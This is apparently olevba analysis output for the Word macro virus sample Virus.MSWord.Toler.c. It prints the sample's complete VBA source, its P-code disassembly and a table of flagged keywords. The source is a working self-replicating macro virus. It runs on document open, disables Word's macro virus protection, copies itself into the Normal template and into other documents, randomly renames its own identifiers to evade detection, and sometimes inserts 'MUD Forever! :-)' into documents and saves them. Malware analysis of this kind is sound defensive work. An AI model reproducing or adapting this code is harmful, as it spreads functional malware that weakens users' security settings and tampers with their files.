olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Toler.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Toler.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Tolerance!
Private Type XxnwZ
  HocnbbZ As Integer
  NicfZ As Integer
  NyheakZ As Boolean
End Type

Private Sub Document_Close()

End Sub

Private Sub Document_Open()
  Randomize
  Options.VirusProtection = False
  Dim NdaqenZ As Object, DibfZ As Object
  Set NdaqenZ = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
  Set DibfZ = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
  Dim IaZ As XxnwZ, ExivsxZ As XxnwZ: IaZ = MsbnZ(NdaqenZ): ExivsxZ = MsbnZ(DibfZ)
  If ExivsxZ.NicfZ = 0 Then
     TcephsqjZ NdaqenZ, DibfZ, IaZ, ExivsxZ
     Options.SaveNormalPrompt = False
  End If
  If (IaZ.NicfZ = 0) Or ((ExivsxZ.NicfZ <> 0) And (IaZ.NicfZ <> ExivsxZ.NicfZ)) Then
     TcephsqjZ DibfZ, NdaqenZ, ExivsxZ, IaZ
    



  ElseIf Rnd < 0.3 Then
     ActiveDocument.Range(0, 0).InsertParagraphBefore
     ActiveDocument.Range(0, 0).InsertBefore "MUD Forever! :-)"
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  End If
End Sub
Private Sub TcephsqjZ(HocnbbZ As Object, YyobZ As Object, FromP As XxnwZ, ToP As XxnwZ)
  Dim PhZ As String, YkqcZ
  PhZ = HocnbbZ.Lines(FromP.HocnbbZ, FromP.NicfZ)
  YkqcZ = Array("OtmbaZ", "XxnwZ", "HocnbbZ", "YyobZ", "TofZ", "NicfZ", "NyheakZ", "NdaqenZ", "DibfZ", "IaZ", "ExivsxZ", "TcephsqjZ", "PhZ", "WxaxmZ", "AxncZ", "HkajfZ", "MsbnZ", "LkhctvnZ", "YkqcZ")
  For I = 0 To 18: LkhctvnZ PhZ, (YkqcZ(I)), OtmbaZ(PhZ): Next I
  If ToP.NyheakZ Then YyobZ.DeleteLines 1, YyobZ.CountOfLines
  YyobZ.AddFromString PhZ
End Sub
Private Function OtmbaZ(PhZ As String) As String
  Dim WxaxmZ As String: WxaxmZ = ""
  While (InStr(PhZ, WxaxmZ) <> 0) Or (Len(WxaxmZ) < 3)
     WxaxmZ = ""
     For I = 1 To 10
         If Rnd > 0.5 Then
            If Len(WxaxmZ) = 0 Then
                  WxaxmZ = WxaxmZ + Chr(Int(Rnd * 25 + 65))
            Else: WxaxmZ = WxaxmZ + Chr(Int(Rnd * 25 + 97))
            End If
         End If
     Next I
     WxaxmZ = WxaxmZ + "Z"
  Wend
  OtmbaZ = WxaxmZ
End Function
Private Sub LkhctvnZ(PhZ As String, AxncZ As String, HkajfZ As String)
  Dim I As Long
  I = 1
  While InStr(I, PhZ, AxncZ) <> 0
        I = InStr(I, PhZ, AxncZ)
        PhZ = Left(PhZ, I - 1) + HkajfZ + Mid$(PhZ, I + Len(AxncZ))
        Index = Index + 1
  Wend
End Sub
Private Function MsbnZ(TofZ As Object) As XxnwZ
  MsbnZ.HocnbbZ = 0
  MsbnZ.NicfZ = 0
  MsbnZ.NyheakZ = False
  For I = 1 To TofZ.CountOfLines
   If TofZ.Lines(I, 1) = "' Tolerance!" Then MsbnZ.HocnbbZ = I
   If TofZ.Lines(I, 1) = "End Function 'Tolerance!" Then MsbnZ.NicfZ = I - MsbnZ.HocnbbZ + 1
   If InStr(TofZ.Lines(I, 1), "Private Sub Document_Open()") = 1 Then MsbnZ.NyheakZ = True
  Next I
End Function 'Tolerance!
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Toler.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6491 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000B " Tolerance!"
' Line #1:
' 	Type (Private) XxnwZ
' Line #2:
' 	DimImplicit 
' 	VarDefn HocnbbZ (As Integer)
' Line #3:
' 	DimImplicit 
' 	VarDefn NicfZ (As Integer)
' Line #4:
' 	DimImplicit 
' 	VarDefn NyheakZ (As Boolean)
' Line #5:
' 	EndType 
' Line #6:
' Line #7:
' 	FuncDefn (Private Sub Document_Close())
' Line #8:
' Line #9:
' 	EndSub 
' Line #10:
' Line #11:
' 	FuncDefn (Private Sub Document_Open())
' Line #12:
' 	ArgsCall Read 0x0000 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #14:
' 	Dim 
' 	VarDefn NdaqenZ (As Object)
' 	VarDefn DibfZ (As Object)
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set NdaqenZ 
' Line #16:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set DibfZ 
' Line #17:
' 	Dim 
' 	VarDefn IaZ (As XxnwZ)
' 	VarDefn ExivsxZ (As XxnwZ)
' 	BoS 0x0000 
' 	Ld NdaqenZ 
' 	ArgsLd MsbnZ 0x0001 
' 	St IaZ 
' 	BoS 0x0000 
' 	Ld DibfZ 
' 	ArgsLd MsbnZ 0x0001 
' 	St ExivsxZ 
' Line #18:
' 	Ld ExivsxZ 
' 	MemLd NicfZ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	Ld NdaqenZ 
' 	Ld DibfZ 
' 	Ld IaZ 
' 	Ld ExivsxZ 
' 	ArgsCall TcephsqjZ 0x0004 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Ld IaZ 
' 	MemLd NicfZ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld ExivsxZ 
' 	MemLd NicfZ 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Ld IaZ 
' 	MemLd NicfZ 
' 	Ld ExivsxZ 
' 	MemLd NicfZ 
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #23:
' 	Ld DibfZ 
' 	Ld NdaqenZ 
' 	Ld ExivsxZ 
' 	Ld IaZ 
' 	ArgsCall TcephsqjZ 0x0004 
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	ElseIfBlock 
' Line #29:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	ArgsMemCall InsertParagraphBefore 0x0000 
' Line #30:
' 	LitStr 0x0010 "MUD Forever! :-)"
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	ArgsMemCall InsertBefore 0x0001 
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Private Sub TcephsqjZ(HocnbbZ As Object, YyobZ As Object, FromP As , ToP As ))
' Line #35:
' 	Dim 
' 	VarDefn PhZ (As String)
' 	VarDefn YkqcZ
' Line #36:
' 	Ld FromP 
' 	MemLd HocnbbZ 
' 	Ld FromP 
' 	MemLd NicfZ 
' 	Ld HocnbbZ 
' 	ArgsMemLd Lines 0x0002 
' 	St PhZ 
' Line #37:
' 	LitStr 0x0006 "OtmbaZ"
' 	LitStr 0x0005 "XxnwZ"
' 	LitStr 0x0007 "HocnbbZ"
' 	LitStr 0x0005 "YyobZ"
' 	LitStr 0x0004 "TofZ"
' 	LitStr 0x0005 "NicfZ"
' 	LitStr 0x0007 "NyheakZ"
' 	LitStr 0x0007 "NdaqenZ"
' 	LitStr 0x0005 "DibfZ"
' 	LitStr 0x0003 "IaZ"
' 	LitStr 0x0007 "ExivsxZ"
' 	LitStr 0x0009 "TcephsqjZ"
' 	LitStr 0x0003 "PhZ"
' 	LitStr 0x0006 "WxaxmZ"
' 	LitStr 0x0005 "AxncZ"
' 	LitStr 0x0006 "HkajfZ"
' 	LitStr 0x0005 "MsbnZ"
' 	LitStr 0x0008 "LkhctvnZ"
' 	LitStr 0x0005 "YkqcZ"
' 	ArgsArray Array 0x0013 
' 	St YkqcZ 
' Line #38:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0012 
' 	For 
' 	BoS 0x0000 
' 	Ld PhZ 
' 	Ld I 
' 	ArgsLd YkqcZ 0x0001 
' 	Paren 
' 	Ld PhZ 
' 	ArgsLd OtmbaZ 0x0001 
' 	ArgsCall LkhctvnZ 0x0003 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	Ld ToP 
' 	MemLd NyheakZ 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld YyobZ 
' 	MemLd CountOfLines 
' 	Ld YyobZ 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #40:
' 	Ld PhZ 
' 	Ld YyobZ 
' 	ArgsMemCall AddFromString 0x0001 
' Line #41:
' 	EndSub 
' Line #42:
' 	FuncDefn (Private Function OtmbaZ(PhZ As String, id_FFFE As String) As String)
' Line #43:
' 	Dim 
' 	VarDefn WxaxmZ (As String)
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St WxaxmZ 
' Line #44:
' 	Ld PhZ 
' 	Ld WxaxmZ 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	Paren 
' 	Ld WxaxmZ 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Lt 
' 	Paren 
' 	Or 
' 	While 
' Line #45:
' 	LitStr 0x0000 ""
' 	St WxaxmZ 
' Line #46:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #47:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	IfBlock 
' Line #48:
' 	Ld WxaxmZ 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #49:
' 	Ld WxaxmZ 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St WxaxmZ 
' Line #50:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld WxaxmZ 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St WxaxmZ 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #54:
' 	Ld WxaxmZ 
' 	LitStr 0x0001 "Z"
' 	Add 
' 	St WxaxmZ 
' Line #55:
' 	Wend 
' Line #56:
' 	Ld WxaxmZ 
' 	St OtmbaZ 
' Line #57:
' 	EndFunc 
' Line #58:
' 	FuncDefn (Private Sub LkhctvnZ(PhZ As String, AxncZ As String, HkajfZ As String))
' Line #59:
' 	Dim 
' 	VarDefn I (As Long)
' Line #60:
' 	LitDI2 0x0001 
' 	St I 
' Line #61:
' 	Ld I 
' 	Ld PhZ 
' 	Ld AxncZ 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	While 
' Line #62:
' 	Ld I 
' 	Ld PhZ 
' 	Ld AxncZ 
' 	FnInStr3 
' 	St I 
' Line #63:
' 	Ld PhZ 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld HkajfZ 
' 	Add 
' 	Ld PhZ 
' 	Ld I 
' 	Ld AxncZ 
' 	FnLen 
' 	Add 
' 	ArgsLd Mid$$ 0x0002 
' 	Add 
' 	St PhZ 
' Line #64:
' 	Ld Index 
' 	LitDI2 0x0001 
' 	Add 
' 	St Index 
' Line #65:
' 	Wend 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Private Function MsbnZ(TofZ As Object, id_FFFE As ) As <crash>)
' Line #68:
' 	LitDI2 0x0000 
' 	Ld MsbnZ 
' 	MemSt HocnbbZ 
' Line #69:
' 	LitDI2 0x0000 
' 	Ld MsbnZ 
' 	MemSt NicfZ 
' Line #70:
' 	LitVarSpecial (False)
' 	Ld MsbnZ 
' 	MemSt NyheakZ 
' Line #71:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld TofZ 
' 	MemLd CountOfLines 
' 	For 
' Line #72:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld TofZ 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "' Tolerance!"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld I 
' 	Ld MsbnZ 
' 	MemSt HocnbbZ 
' 	EndIf 
' Line #73:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld TofZ 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0018 "End Function 'Tolerance!"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld I 
' 	Ld MsbnZ 
' 	MemLd HocnbbZ 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld MsbnZ 
' 	MemSt NicfZ 
' 	EndIf 
' Line #74:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Ld TofZ 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld MsbnZ 
' 	MemSt NyheakZ 
' 	EndIf 
' Line #75:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #76:
' 	EndFunc 
' 	QuoteRem 0x000D 0x000A "Tolerance!"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

